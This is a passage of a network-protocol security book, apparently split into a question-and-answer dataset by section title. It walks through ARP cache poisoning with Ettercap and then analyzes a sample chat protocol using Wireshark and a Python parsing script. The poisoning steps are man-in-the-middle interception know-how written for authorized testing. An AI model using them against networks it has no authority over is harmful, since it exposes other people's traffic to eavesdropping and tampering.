example ARP request packet\nFigure 4-9: An example ARP response\nHow can you use ARP poisoning to your advantage? As with DHCP,\nthere’s no authentication on ARP packets, which are intentionally sent to all\nnodes on the Ethernet network. Therefore, you can inform the target node\nyou own an IP address and ensure the node forwards traffic to your rogue\ngateway by sending spoofed ARP packets to poison the target node’s ARP\ncache. You can use Ettercap to spoof the packets, as shown in Figure 4-10.\nNetwork 192.168.100.0\nOriginal route\nClient: 192.168.100.1 Router: 192.168.100.10\nRedirected route\nMAC: 08:00:27:33:81:6d MAC: 08:00:27:68:95:c3\nA\nR P\np o iso\nn A\nRP p\nois\non\nProxy (192.168.100.5)\nMAC: 08:00:27:38:dc:e6\nFigure 4-10: ARP poisoning\nIn Figure 4-10, Ettercap sends spoofed ARP packets to the client and\nthe router on the local network. If spoofing succeeds, these ARP packets\nwill change the cached ARP entries for both devices to point to your proxy.\nAdvanced Application Traffic Capture 75\nWARNING Be sure to spoof ARP packets to both the client and the router to ensure that you get\nboth sides of the communication. Of course, if all you want is one side of the commu-\nnication, you only need to poison one or the other node.\nTo start ARP poisoning, follow these steps:\n1. Start Ettercap, and enter Unified Sniffing mode as you did with DHCP\nspoofing.\n2. Select the network interface to poison (the one connected to the net-\nwork with the nodes you want to poison).\n3. Configure a list of hosts to ARP poison. The easiest way to get a list of\nhosts is to let Ettercap scan for you by choosing Hosts4Scan For Hosts.\nDepending on the size of the network, scanning can take from a few\nseconds to hours. When the scan is complete, choose Hosts4Host List;\na dialog like the one in Figure 4-11 should appear.\nFigure 4-11: A list of discovered hosts\nAs you can see in Figure 4-11, we’ve found two hosts. In this case,\none is the client node that you want to capture, which is on IP address\n192.168.100.1 with a MAC address of 08:00:27:33:81:6d. The other node\nis the gateway to the internet on IP address 192.168.100.10 with a MAC\naddress of 08:00:27:68:95:c3. Most likely, you’ll already know the IP\naddresses configured for each network device, so you can determine\nwhich is the local machine and which is the remote machine.\n76 Chapter 4"
  },
  {
    "input": "Final Words",
    "output": "4. Choose your targets. Select one of the hosts from the list and click Add\nto Target 1; select the other host you want to poison and click Add to\nTarget 2. (Target 1 and Target 2 differentiate between the client and\nthe gateway.) This should enable one-way ARP poisoning in which only\ndata sent from Target 1 to Target 2 is rerouted.\n5. Start ARP poisoning by choosing Mitm4ARP poisoning. A dialog\nshould appear. Accept the defaults and click OK. Ettercap should\nattempt to poison the ARP cache of your chosen targets. ARP poison-\ning may not work immediately because the ARP cache has to refresh.\nIf poisoning is successful, the client node should look similar to\nFigure 4-12.\nFigure 4-12: Successful ARP poisoning\nFigure 4-12 shows the router was poisoned at IP 192.168.100.10, which\nhas had its MAC Hardware address modified to the proxy’s MAC address\nof 08:00:27:08:dc:e6. (For comparison, see the corresponding entry in\nFigure 4-11.) Now any traffic that is sent from the client to the router will\ninstead be sent to the proxy (shown by the MAC address of 192.168.100.5).\nThe proxy can forward the traffic to the correct destination after capturing\nor modifying it.\nOne advantage that ARP poisoning has over DHCP spoofing is that you\ncan redirect nodes on the local network to communicate with your gateway\neven if the destination is on the local network. ARP poisoning doesn’t have\nto poison the connection between the node and the external gateway if you\ndon’t want it to.\nFinal words\nIn this chapter, you’ve learned a few additional ways to capture and modify\ntraffic between a client and server. I began by describing how to configure\nyour OS as an IP gateway, because if you can forward traffic through your\nown gateway, you have a number of techniques available to you.\nOf course, just getting a device to send traffic to your network capture\ndevice isn’t always easy, so employing techniques such as DHCP spoofing or\nARP poisoning is important to ensure that traffic is sent to your device rather\nthan directly to the internet. Fortunately, as you’ve seen, you don’t need cus-\ntom tools to do so; all the tools you need are either already included in your\noperating system (especially if you’re running Linux) or easily downloadable.\nAdvanced Application Traffic Capture 77"
  },
  {
    "input": "Chapter 5: Analysis from the Wire",
    "output": "5\nANALySIS f ROm THE W IRE\nIn Chapter 2, I discussed how to capture network traf-\nfic for analysis. Now it’s time to put that knowledge to\nthe test. In this chapter, we’ll examine how to analyze\ncaptured network protocol traffic from a chat appli-\ncation to understand the protocol in use. If you can\ndetermine which features a protocol supports, you\ncan assess its security.\nAnalysis of an unknown protocol is typically incremental. You begin\nby capturing network traffic, and then analyze it to try to understand what\neach part of the traffic represents. Throughout this chapter, I’ll show you\nhow to use Wireshark and some custom code to inspect an unknown net-\nwork protocol. Our approach will include extracting structures and state\ninformation."
  },
  {
    "input": "Starting Clients",
    "output": "the traffic-producing application: superFunkychat\nThe test subject for this chapter is a chat application I’ve written in C# called\nSuperFunkyChat, which will run on Windows, Linux, and macOS. Download\nthe latest prebuild applications and source code from the GitHub page at\nhttps://github.com/tyranid/ExampleChatApplication/releases/; be sure to choose\nthe release binaries appropriate for your platform. (If you’re using Mono,\nchoose the .NET version, and so on.) The example client and server console\napplications for SuperFunkyChat are called ChatClient and ChatServer.\nAfter you’ve downloaded the application, unpack the release files to a\ndirectory on your machine so you can run each application. For the sake\nof simplicity, all example command lines will use the Windows executable\nbinaries. If you’re running under Mono, prefix the command with the path\nto the main mono binary. When running files for .NET Core, prefix the\ncommand with the dotnet binary. The files for .NET will have a .dll extension\ninstead of .exe.\nStarting the Server\nStart the server by running ChatServer.exe with no parameters. If successful,\nit should print some basic information, as shown in Listing 5-1.\nC:\\SuperFunkyChat> ChatServer.exe\nChatServer (c) 2017 James Forshaw\nWARNING: Don't use this for a real chat system!!!\nRunning server on port 12345 Global Bind False\nListing 5-1: Example output from running ChatServer\nNOTE Pay attention to the warning! This application has not been designed to be a secure\nchat system.\nNotice in Listing 5-1 that the final line prints the port the server is run-\nning on (12345 in this case) and whether the server has bound to all inter-\nfaces (global). You probably won’t need to change the port (--port NUM), but\nyou might need to change whether the application is bound to all interfaces\nif you want clients and the server to exist on different computers. This is\nespecially important on Windows. It’s not easy to capture traffic to the local\nloopback interface on Windows; if you encounter any difficulties, you may\nneed to run the server on a separate computer or a virtual machine (VM).\nTo bind to all interfaces, specify the --global parameter.\nStarting Clients\nWith the server running, we can start one or more clients. To start a client,\nrun ChatClient.exe (see Listing 5-2), specify the username you want to use on\nthe server (the username can be anything you like), and specify the server\nhostname (for example, localhost). When you run the client, you should see\noutput similar to that shown in Listing 5-2. If you see any errors, make sure\n80 Chapter 5"
  },
  {
    "input": "A Crash Course in Analysis with Wireshark",
    "output": "you’ve set up the server correctly, including requiring binding to all inter-\nfaces or disabling the firewall on the server.\nC:\\SuperFunkyChat> ChatClient.exe USERNAME HOSTNAME\nChatClient (c) 2017 James Forshaw\nWARNING: Don't use this for a real chat system!!!\nConnecting to localhost:12345\nListing 5-2: Example output from running ChatClient\nAs you start the client, look at the running server: you should see output\non the console similar to Listing 5-3, indicating that the client has success-\nfully sent a “Hello” packet.\nConnection from 127.0.0.1:49825\nReceived packet ChatProtocol.HelloProtocolPacket\nHello Packet for User: alice HostName: borax\nListing 5-3: The server output when a client connects\nCommunicating Between Clients\nAfter you’ve completed the preceding steps successfully, you should be able\nto connect multiple clients so you can communicate between them. To send\na message to all users with the ChatClient, enter the message on the com-\nmand line and press ENTER.\nThe ChatClient also supports a few other commands, which all begin\nwith a forward slash (/), as detailed in Table 5-1.\nTable 5-1: Commands for the ChatClient Application\nCommand Description\n/quit [message] Quit client with optional message\n/msg user message Send a message to a specific user\n/list List other users on the system\n/help Print help information\nYou’re ready to generate traffic between the SuperFunkyChat clients\nand server. Let’s start our analysis by capturing and inspecting some traffic\nusing Wireshark.\na crash course in analysis with wireshark\nIn Chapter 2, I introduced Wireshark but didn’t go into any detail on how\nto use Wireshark to analyze rather than simply capture traffic. Because\nWireshark is a very powerful and comprehensive tool, I’ll only scratch\nthe surface of its functionality here. When you first start Wireshark on\nWindows, you should see a window similar to the one shown in Figure 5-1.\nAnalysis from the Wire 81\nFigure 5-1: The main Wireshark window on Windows\nThe main window allows you to choose the interface to capture traffic\nfrom. To ensure we capture only the traffic we want to analyze, we need to\nconfigure some options on the interface. Select Capture4Options from\nthe menu. Figure 5-2 shows the options dialog that opens.\n\n\nFigure 5-2: The Wireshark Capture Interfaces dialog\nSelect the network interface you want to capture traffic from, as shown\nat . Because we’re using Windows, choose Local Area Connection, which is\nour main Ethernet connection; we can’t easily capture from Localhost. Then\nset a capture filter . In this case, we specify the filter ip host 192.168.10.102\nto limit capture to traffic to or from the IP address 192.168.10.102. (The IP\n82 Chapter 5"
  },
  {
    "input": "Generating Network Traffic and Capturing Packets",
    "output": "address we’re using is the chat server’s address. Change the IP address as\nappropriate for your configuration.) Click the Start button to begin captur-\ning traffic.\nGenerating Network Traffic and Capturing Packets\nThe main approach to packet analysis is to generate as much traffic from\nthe target application as possible to improve your chances of finding its\nvarious protocol structures. For example, Listing 5-4 shows a single session\nwith ChatClient for alice.\n# alice - Session\n> Hello There!\n< bob: I've just joined from borax\n< bob: How are you?\n< bob: This is nice isn't it?\n< bob: Woo\n< Server: 'bob' has quit, they said 'I'm going away now!'\n< bob: I've just joined from borax\n< bob: Back again for another round.\n< Server: 'bob' has quit, they said 'Nope!'\n> /quit\n< Server: Don't let the door hit you on the way out!\nListing 5-4: Single ChatClient session for alice.\nAnd Listing 5-5 and Listing 5-6 show two sessions for bob.\n# bob - Session 1\n> How are you?\n> This is nice isn't it?\n> /list\n< User List\n< alice - borax\n> /msg alice Woo\n> /quit\n< Server: Don't let the door hit you on the way out!\nListing 5-5: First ChatClient session for bob\n# bob - Session 2\n> Back again for another round.\n> /quit Nope!\n< Server: Don't let the door hit you on the way out!\nListing 5-6: Second ChatClient session for bob\nWe run two sessions for bob so we can capture any connection or discon-\nnection events that might only occur between sessions. In each session, a right\nangle bracket (>) indicates a command to enter into the ChatClient, and a\nleft angle bracket (<) indicates responses from the server being written to the\nAnalysis from the Wire 83"
  },
  {
    "input": "Basic Analysis",
    "output": "console. You can execute the commands to the client for each of these session\ncaptures to reproduce the rest of the results in this chapter for analysis.\nNow turn to Wireshark. If you’ve configured Wireshark correctly and\nbound it to the correct interface, you should start seeing packets being cap-\ntured, as shown in Figure 5-3.\nFigure 5-3: Captured traffic in Wireshark\nAfter running the example sessions, stop the capture by clicking the\nStop button (highlighted) and save the packets for later use if you want.\nBasic Analysis\nLet’s look at the traffic we’ve captured. To get an overview of the communica-\ntion that occurred during the capture period, choose among the options on\nthe Statistics menu. For example, choose Statistics4Conversations, and you\nshould see a new window displaying high-level conversations such as TCP ses-\nsions, as shown in the Conversations window in Figure 5-4.\nFigure 5-4: The Wireshark Conversations window\n84 Chapter 5"
  },
  {
    "input": "Reading the Contents of a TCP Session",
    "output": "The Conversations window shows three separate TCP conversations in\nthe captured traffic. We know that the SuperFunkyChat client application\nuses port 12345, because we see three separate TCP sessions coming from\nport 12345. These sessions should correspond to the three client sessions\nshown in Listing 5-4, Listing 5-5, and Listing 5-6.\nReading the Contents of a TCP Session\nTo view the captured traffic for a single conversation, select one of the con-\nversations in the Conversations window and click the Follow Stream button.\nA new window displaying the contents of the stream as ASCII text should\nappear, as shown in Figure 5-5.\n\nFigure 5-5: Displaying the contents of a TCP session in Wireshark’s Follow TCP Stream view\nWireshark replaces data that can’t be represented as ASCII characters\nwith a single dot character, but even with that character replacement, it’s\nclear that much of the data is being sent in plaintext. That said, the net-\nwork protocol is clearly not exclusively a text-based protocol because the\ncontrol information for the data is nonprintable characters. The only rea-\nson we’re seeing text is that SuperFunkyChat’s primary purpose is to send\ntext messages.\nWireshark shows the inbound and outbound traffic in a session using\ndifferent colors: pink for outbound traffic and blue for inbound. In a TCP\nsession, outbound traffic is from the client that initiated the TCP session, and\ninbound traffic is from the TCP server. Because we’ve captured all traffic to\nthe server, let’s look at another conversation. To change the conversation,\nchange the Stream number  in Figure 5-5 to 1. You should now see a dif-\nferent conversation, for example, like the one in Figure 5-6.\nAnalysis from the Wire 85"
  },
  {
    "input": "Identifying Packet Structure with Hex Dump",
    "output": "Figure 5-6: A second TCP session from a different client\nCompare Figure 5-6 to Figure 5-5; you’ll see the details of the two ses-\nsions are different. Some text sent by the client (in Figure 5-6), such as\n“How are you?”, is shown as received by the server in Figure 5-5. Next, we’ll\ntry to determine what those binary parts of the protocol represent.\nidentifying packet structure with hex dump\nAt this point, we know that our subject protocol seems to be part binary\nand part text, which indicates that looking at just the printable text won’t\nbe enough to determine all the various structures in the protocol.\nTo dig in, we first return to Wireshark’s Follow TCP Stream view, as\nshown in Figure 5-5, and change the Show and save data as drop-down\nmenu to the Hex Dump option. The stream should now look similar to\nFigure 5-7.\n  \nFigure 5-7: The Hex Dump view of the stream\n86 Chapter 5"
  },
  {
    "input": "Viewing Individual Packets",
    "output": "The Hex Dump view shows three columns of information. The column\nat the very left  is the byte offset into the stream for a particular direction.\nFor example, the byte at 0 is the first byte sent in that direction, the byte 4\nis the fifth, and so on. The column in the center  shows the bytes as a hex\ndump. The column at the right  is the ASCII representation, which we saw\npreviously in Figure 5-5.\nViewing Individual Packets\nNotice how the blocks of bytes shown in the center column in Figure 5-7\nvary in length. Compare this again to Figure 5-6; you’ll see that other than\nbeing separated by direction, all data in Figure 5-6 appears as one contigu-\nous block. In contrast, the data in Figure 5-7 might appear as just a few\nblocks of 4 bytes, then a block of 1 byte, and finally a much longer block\ncontaining the main group of text data.\nWhat we’re seeing in Wireshark are individual packets: each block is a\nsingle TCP packet, or segment, containing perhaps only 4 bytes of data. TCP\nis a stream-based protocol, which means that there are no real boundaries\nbetween consecutive blocks of data when you’re reading and writing data to\na TCP socket. However, from a physical perspective, there’s no such thing\nas a real stream-based network transport protocol. Instead, TCP sends indi-\nvidual packets consisting of a TCP header containing information, such as\nthe source and destination port numbers as well as the data.\nIn fact, if we return to the main Wireshark window, we can find a\npacket to prove that Wireshark is displaying single TCP packets. Select\nEdit4Find Packet, and an additional drop-down menu appears in the\nmain window, as shown Figure 5-8.\n  \n\n\n\nFigure 5-8: Finding a packet in Wireshark’s main window\nAnalysis from the Wire 87"
  },
  {
    "input": "Determining the Protocol Structure",
    "output": "We’ll find the first value shown in Figure 5-7, the string BINX. To do this,\nfill in the Find options as shown in Figure 5-8. The first selection box indi-\ncates where in the packet capture to search. Specify that you want to search\nin the Packet bytes . Leave the second selection box as Narrow & Wide,\nwhich indicates that you want to search for both ASCII and Unicode strings.\nAlso leave the Case sensitive box unchecked and specify that you want to\nlook for a String value  in the third drop-down menu. Then enter the\nstring value we want to find, in this case the string BINX . Finally, click\nthe Find button, and the main window should automatically scroll and\nhighlight the first packet Wireshark finds that contains the BINX string x.\nIn the middle window at y, you should see that the packet contains 4 bytes,\nand you can see the raw data in the bottom window, which shows that we’ve\nfound the BINX string z. We now know that the Hex Dump view Wireshark\ndisplays in Figure 5-8 represents packet boundaries because the BINX string\nis in a packet of its own.\nDetermining the Protocol Structure\nTo simplify determining the protocol structure, it makes sense to look\nonly at one direction of the network communication. For example, let’s\njust look at the outbound direction (from client to server) in Wireshark.\nReturning to the Follow TCP Stream view, select the Hex Dump option in\nthe Show and save data as drop-down menu. Then select the traffic direc-\ntion from the client to the server on port 12345 from the drop-down menu\nat , as shown in Figure 5-9.\n\nFigure 5-9: A hex dump showing only the outbound direction\nClick the Save as . . . button to copy the outbound traffic hex dump to a\ntext file to make it easier to inspect. Listing 5-7 shows a small sample of that\ntraffic saved as text.\n00000000 42 49 4e 58 BINX\n00000004 00 00 00 0d ....\n00000008 00 00 03 55 ...U\n88 Chapter 5"
  },
  {
    "input": "Testing Our Assumptions",
    "output": "0000000C 00 .x\n0000000D 05 61 6c 69 63 65 04 4f 4e 59 58 00 .alice.O NYX.y\n00000019 00 00 00 14 ....\n0000001D 00 00 06 3f ...?\n00000021 03 .\n00000022 05 61 6c 69 63 65 0c 48 65 6c 6c 6f 20 54 68 65 .alice.H ello The\n00000032 72 65 21 re!\n--snip--\nListing 5-7: A snippet of outbound traffic\nThe outbound stream begins with the four characters BINX . These\ncharacters are never repeated in the rest of the data stream, and if you\ncompare different sessions, you’ll always find the same four characters at\nthe start of the stream. If I were unfamiliar with this protocol, my intuition\nat this point would be that this is a magic value sent from the client to the\nserver to tell the server that it’s talking to a valid client rather than some\nother application that happens to have connected to the server’s TCP port.\nFollowing the stream, we see that a sequence of four blocks is sent. The\nblocks at  and  are 4 bytes, the block at x is 1 byte, and the block at y\nis larger and contains mostly readable text. Let’s consider the first block of\n4 bytes at . Might these represent a small number, say the integer value\n0xD or 13 in decimal?\nRecall the discussion of the Tag, Length, Value (TLV) pattern in\nChapter 3. TLV is a very simple pattern in which each block of data is\ndelimited by a value representing the length of the data that follows. This\npattern is especially important for stream-based protocols, such as those\nrunning over TCP, because otherwise the application doesn’t know how\nmuch data it needs to read from a connection to process the protocol. If\nwe assume that this first value is the length of the data, does this length\nmatch the length of the rest of the packet? Let’s find out.\nCount the total bytes of the blocks at , , x, and y, which seem to\nbe a single packet, and the result is 21 bytes, which is eight more than the\nvalue of 13 we were expecting (the integer value 0xD). The value of the\nlength block might not be counting its own length. If we remove the length\nblock (which is 4 bytes), the result is 17, which is 4 bytes more than the tar-\nget length but getting closer. We also have the other unknown 4-byte block\nat  following the potential length, but perhaps that’s not counted either. Of\ncourse, it’s easy to speculate, but facts are more important, so let’s do some\ntesting.\nTesting Our Assumptions\nAt this point in such an analysis, I stop staring at a hex dump because it’s not\nthe most efficient approach. One way to quickly test whether our assumptions\nare right is to export the data for the stream and write some simple code to\nparse the structure. Later in this chapter, we’ll write some code for Wireshark\nto do all of our testing within the GUI, but for now we’ll implement the code\nusing Python on the command line.\nAnalysis from the Wire 89"
  },
  {
    "input": "Dissecting the Protocol with Python",
    "output": "To get our data into Python, we could add support for reading Wireshark\ncapture files, but for now we’ll just export the packet bytes to a file. To export\nthe packets from the dialog shown in Figure 5-9, follow these steps:\n1. In the Show and save data as drop-down menu, choose the Raw option.\n2. Click Save As to export the outbound packets to a binary file called\nbytes_outbound.bin.\nWe also want to export the inbound packets, so change to and select\nthe inbound conversation. Then save the raw inbound bytes using the pre-\nceding steps, but name the file bytes_inbound.bin.\nNow use the XXD tool (or a similar tool) on the command line to be\nsure that we’ve successfully dumped the data, as shown in Listing 5-8.\n$ xxd bytes_outbound.bin\n00000000: 4249 4e58 0000 000f 0000 0473 0003 626f BINX.......s..bo\n00000010: 6208 7573 6572 2d62 6f78 0000 0000 1200 b.user-box......\n00000020: 0005 8703 0362 6f62 0c48 6f77 2061 7265 .....bob.How are\n00000030: 2079 6f75 3f00 0000 1c00 0008 e303 0362 you?..........b\n00000040: 6f62 1654 6869 7320 6973 206e 6963 6520 ob.This is nice\n00000050: 6973 6e27 7420 6974 3f00 0000 0100 0000 isn't it?.......\n00000060: 0606 0000 0013 0000 0479 0505 616c 6963 .........y..alic\n00000070: 6500 0000 0303 626f 6203 576f 6f00 0000 e.....bob.Woo...\n00000080: 1500 0006 8d02 1349 276d 2067 6f69 6e67 .......I'm going\n00000090: 2061 7761 7920 6e6f 7721 away now!\nListing 5-8: The exported packet bytes\nDissecting the Protocol with Python\nNow we’ll write a simple Python script to dissect the protocol. Because\nwe’re just extracting data from a file, we don’t need to write any network\ncode; we just need to open the file and read the data. We’ll also need to\nread binary data from the file—specifically, a network byte order integer\nfor the length and unknown 4-byte block.\nPerforming the Binary Conversion\nWe can use the built-in Python struct library to do the binary conversions.\nThe script should fail immediately if something doesn’t seem right, such as\nnot being able to read all the data we expect from the file. For example, if\nthe length is 100 bytes and we can read only 20 bytes, the read should fail.\nIf no errors occur while parsing the file, we can be more confident that our\nanalysis is correct. Listing 5-9 shows the first implementation, written to\nwork in both Python 2 and 3.\nfrom struct import unpack\nimport sys\nimport os\n90 Chapter 5\n# Read fixed number of bytes\n def read_bytes(f, l):\nbytes = f.read(l)\n if len(bytes) != l:\nraise Exception(\"Not enough bytes in stream\")\nreturn bytes\n# Unpack a 4-byte network byte order integer\n def read_int(f):\nreturn unpack(\"!i\", read_bytes(f, 4))[0]\n# Read a single byte\nx def read_byte(f):\nreturn ord(read_bytes(f, 1))\nfilename = sys.argv[1]\nfile_size = os.path.getsize(filename)\nf = open(filename, \"rb\")\ny print(\"Magic: %s\" % read_bytes(f, 4))\n# Keep reading until we run out of file\nz while f.tell() < file_size:\nlength = read_int(f)\nunk1 = read_int(f)\nunk2 = read_byte(f)\ndata = read_bytes(f, length - 1)\nprint(\"Len: %d, Unk1: %d, Unk2: %d, Data: %s\"\n% (length, unk1, unk2, data))\nListing 5-9: An example Python script for parsing protocol data\nLet’s break down the important parts of the script. First, we define some\nhelper functions to read data from the file. The function read_bytes()  reads\na fixed number of bytes from the file specified as a parameter. If not enough\nbytes are in the file to satisfy the read, an exception is thrown to indicate an\nerror . We also define a function read_int()  to read a 4-byte integer from\nthe file in network byte order where the most significant byte of the integer\nis first in the file, as well as define a function to read a single byte x. In the\nmain body of the script, we open a file passed on the command line and first\nread a 4-byte value y, which we expect is the magic value BINX. Then the code\nenters a loop z while there’s still data to read, reading out the length, the\ntwo unknown values, and finally the data and then printing the values to the\nconsole.\nWhen you run the script in Listing 5-9 and pass it the name of a binary\nfile to open, all data from the file should be parsed and no errors gener-\nated if our analysis that the first 4-byte block was the length of the data sent\non the network is correct. Listing 5-10 shows example output in Python 3,\nwhich does a better job of displaying binary strings than Python 2.\nAnalysis from the Wire 91\n$ python3 read_protocol.py bytes_outbound.bin\nMagic: b'BINX'\nLen: 15, Unk1: 1139, Unk2: 0, Data: b'\\x03bob\\x08user-box\\x00'\nLen: 18, Unk1: 1415, Unk2: 3, Data: b'\\x03bob\\x0cHow are you?'\nLen: 28, Unk1: 2275, Unk2: 3, Data: b\"\\x03bob\\x16This is nice isn't it?\"\nLen: 1, Unk1: 6, Unk2: 6, Data: b''\nLen: 19, Unk1: 1145, Unk2: 5, Data: b'\\x05alice\\x00\\x00\\x00\\x03\\x03bob\\x03Woo'\nLen: 21, Unk1: 1677, Unk2: 2, Data: b\"\\x13I'm going away now!\"\nListing 5-10: Example output from running Listing 5-9 against a binary file\nHandling Inbound Data\nIf you ran Listing 5-9 against an exported inbound data set, you would\nimmediately get an error because there’s no magic string BINX in the\ninbound protocol, as shown in Listing 5-11. Of course, this is what we\nwould expect if there were a mistake in our analysis and the length field\nwasn’t quite as simple as we thought.\n$ python3 read_protocol.py bytes_inbound.bin\nMagic: b'\\x00\\x00\\x00\\x02'\nLength: 1, Unknown1: 16777216, Unknown2: 0, Data: b''\nTraceback (most recent call last):\nFile \"read_protocol.py\", line 31, in <module>\ndata = read_bytes(f, length - 1)\nFile \"read_protocol.py\", line 9, in read_bytes\nraise Exception(\"Not enough bytes in stream\")\nException: Not enough bytes in stream\nListing 5-11: Error generated by Listing 5-9 on inbound data\nWe can clear up this error by modifying the script slightly to include a\ncheck for the magic value and reset the file pointer if it’s not equal to the\nstring BINX. Add the following line just after the file is opened in the original\nscript to reset the file pointer to the start if the magic value is incorrect.\nif read_bytes(f, 4) != b'BINX': f.seek(0)\nNow, with this small modification, the script will execute successfully\non the inbound data and result in the output shown in Listing 5-12.\n$ python3 read_protocol.py bytes_inbound.bin\nLen: 2, Unk1: 1, Unk2: 1, Data: b'\\x00'\nLen: 36, Unk1: 3146, Unk2: 3, Data: b\"\\x03bob\\x1eI've just joined from user-box\"\nLen: 18, Unk1: 1415, Unk2: 3, Data: b'\\x03bob\\x0cHow are you?'\nListing 5-12: Output of modified script on inbound data\n92 Chapter 5\nDigging into the Unknown Parts of the Protocol\nWe can use the output in Listing 5-10 and Listing 5-12 to start delving into\nthe unknown parts of the protocol. First, consider the field labeled Unk1.\nThe values it takes seem to be different for every packet, but the values are\nlow, ranging from 1 to 3146.\nBut the most informative parts of the output are the following two\nentries, one from the outbound data and one from the inbound.\nOUTBOUND: Len: 1, Unk1: 6, Unk2: 6, Data: b''\nINBOUND: Len: 2, Unk1: 1, Unk2: 1, Data: b'\\x00'\nNotice that in both entries the value of Unk1 is the same as Unk2. That\ncould be a coincidence, but the fact that both entries have the same value\nmight indicate something important. Also notice that in the second entry\nthe length is 2, which includes the Unk2 value and a 0 data value, whereas the\nlength of the first entry is only 1 with no trailing data after the Unk2 value.\nPerhaps Unk1 is directly related to the data in the packet? Let’s find out.\nCalculating the Checksum\nIt’s common to add a checksum to a network protocol. The canonical\nexample of a checksum is just the sum of all the bytes in the data you\nwant to check for errors. If we assume that the unknown value is a simple\nchecksum, we can sum all the bytes in the example outbound and inbound\npackets I highlighted in the preceding section, resulting in the calculated\nsum shown in Table 5-2.\nTable 5-2: Testing Checksum for Example Packets\nUnknown value Data bytes Sum of data bytes\n6 6 6\n1 1, 0 1\nAlthough Table 5-2 seems to confirm that the unknown value matches\nour expectation of a simple checksum for very simple packets, we still need\nto verify that the checksum works for larger and more complex packets.\nThere are two easy ways to determine whether we’ve guessed correctly that\nthe unknown value is a checksum over the data. One way is to send simple,\nincrementing messages from a client (like A, then B, then C, and so on),\ncapture the data, and analyze it. If the checksum is a simple addition, the\nvalue should increment by 1 for each incrementing message. The alterna-\ntive would be to add a function to calculate the checksum to see whether\nthe checksum matches between what was captured on the network and our\ncalculated value.\nAnalysis from the Wire 93\nTo test our assumptions, add the code in Listing 5-13 to the script in\nListing 5-7 and add a call to it after reading the data to calculate the check-\nsum. Then just compare the value extracted from the network capture as Unk1\nand the calculated value to see whether our calculated checksum matches.\ndef calc_chksum(unk2, data):\nchksum = unk2\nfor i in range(len(data)):\nchksum += ord(data[i:i+1])\nreturn chksum\nListing 5-13: Calculating the checksum of a packet\nAnd it does! The numbers calculated match the value of Unk1. So, we’ve\ndiscovered the next part of the protocol structure.\nDiscovering a Tag Value\nNow we need to determine what Unk2 might represent. Because the value of\nUnk2 is considered part of the packet’s data, it’s presumably related to the\nmeaning of what is being sent. However, as we saw at x in Listing 5-7, the\nvalue of Unk2 is being written to the network as a single byte value, which\nindicates that it’s actually separate from the data. Perhaps the value rep-\nresents the Tag part of a TLV pattern, just as we suspect that Length is the\nValue part of that construction.\nTo determine whether Unk2 is in fact the Tag value and a representation\nof how to interpret the rest of the data, we’ll exercise the ChatClient as much\nas possible, try all possible commands, and capture the results. We can then\nperform basic analysis comparing the value of Unk2 when sending the same\ntype of command to see whether the value of Unk2 is always the same.\nFor example, consider the client sessions in Listing 5-4, Listing 5-5,\nand Listing 5-6. In the session in Listing 5-5, we sent two messages, one\nafter another. We’ve already analyzed this session using our Python script\nin Listing 5-10. For simplicity, Listing 5-14 shows only the first three cap-\nture packets (with the latest version of the script).\nUnk2: 0, Data: b'\\x03bob\\x08user-box\\x00'\nUnk2: 3, Data: b'\\x03bob\\x0cHow are you?'\nUnk2: 3, Data: b\"\\x03bob\\x16This is nice isn't it?\"\n*SNIP*\nListing 5-14: The first three packets from the session represented by Listing 5-5\nThe first packet  doesn’t correspond to anything we typed into the\nclient session in Listing 5-5. The unknown value is 0. The two messages\nwe then sent in Listing 5-5 are clearly visible as text in the Data part of the\npackets at  and . The Unk2 values for both of those messages is 3, which\nis different from the first packet’s value of 0. Based on this observation, we\ncan assume that the value of 3 might represent a packet that is sending a\nmessage, and if that’s the case, we’d expect to find a value of 3 used in every\n94 Chapter 5"
  },
  {
    "input": "Developing Wireshark Dissectors in Lua",
    "output": "connection when sending a single value. In fact, if you now analyze a differ-\nent session containing messages being sent, you’ll find the same value of 3\nused whenever a message is sent.\nNOTE At this stage in my analysis, I’d return to the various client sessions and try to cor-\nrelate the action I performed in the client with the messages sent. Also, I’d correlate\nthe messages I received from the server with the client’s output. Of course, this is easy\nwhen there’s likely to be a one-to-one match between the command we use in the client\nand the result on the network. However, more complex protocols and applications\nmight not be that obvious, so you’ll have to do a lot of correlation and testing to try\nto discover all the possible values for particular parts of the protocol.\nWe can assume that Unk2 represents the Tag part of the TLV structure.\nThrough further analysis, we can infer the possible Tag values, as shown in\nTable 5-3.\nTable 5-3: Inferred Commands from Analysis of Captured Sessions\nCommand number Direction Description\n0 Outbound Sent when client connects to server .\n1 Inbound Sent from server after client sends command '0'\nto the server .\n2 Both Sent from client when /quit command is used .\nSent by server in response .\n3 Both Sent from client with a message for all users . Sent\nfrom server with the message from all users .\n5 Outbound Sent from client when /msg command is used .\n6 Outbound Sent from client when /list command is used .\n7 Inbound Sent from server in response to /list command .\nNOTE We’ve built a table of commands but we still don’t know how the data for each of these\ncommands is represented. To further analyze that data, we’ll return to Wireshark and\ndevelop some code to dissect the protocol and display it in the GUI. It can be difficult\nto deal with simple binary files, and although we could use a tool to parse a capture\nfile exported from Wireshark, it’s best to have Wireshark handle a lot of that work.\ndeveloping wireshark dissectors in lua\nIt’s easy to analyze a known protocol like HTTP with Wireshark because the\nsoftware can extract all the necessary information. But custom protocols are\na bit more challenging: to analyze them, we’ll have to manually extract all the\nrelevant information from a byte representation of the network traffic.\nFortunately, you can use the Wireshark plug-in Protocol Dissectors to\nadd additional protocol analysis to Wireshark. Doing so used to require\nAnalysis from the Wire 95\nbuilding a dissector in C to work with your particular version of Wireshark,\nbut modern versions of Wireshark support the Lua scripting language. The\nscripts you write in Lua will also work with the tshark command line tool.\nThis section describes how to develop a simple Lua script dissector for\nthe SuperFunkyChat protocol that we’ve been analyzing.\nNOTE Details about developing in Lua and the Wireshark APIs are beyond the scope of\nthis book. For more information on how to develop in Lua, visit its official website\nat https://www.lua.org/docs.html. The Wireshark website, and especially the\nWiki, are the best places to visit for various tutorials and example code (https://\nwiki.wireshark.org/Lua/).\nBefore developing the dissector, make sure your copy of Wireshark\nsupports Lua by checking the About Wireshark dialog at Help4About\nWireshark. If you see the word Lua in the dialog, as shown in Figure 5-10,\nyou should be good to go.\nFigure 5-10: The Wireshark About dialog showing Lua support\nNOTE If you run Wireshark as root on a Unix-like system, Wireshark will typically disable\nLua support for security reasons, and you’ll need to configure Wireshark to run as a\nnonprivileged user to capture and run Lua scripts. See the Wireshark documentation\nfor your operating system to find out how to do so securely.\n96 Chapter 5\nYou can develop dissectors for almost any protocol that Wireshark will\ncapture, including TCP and UDP. It’s much easier to develop dissectors 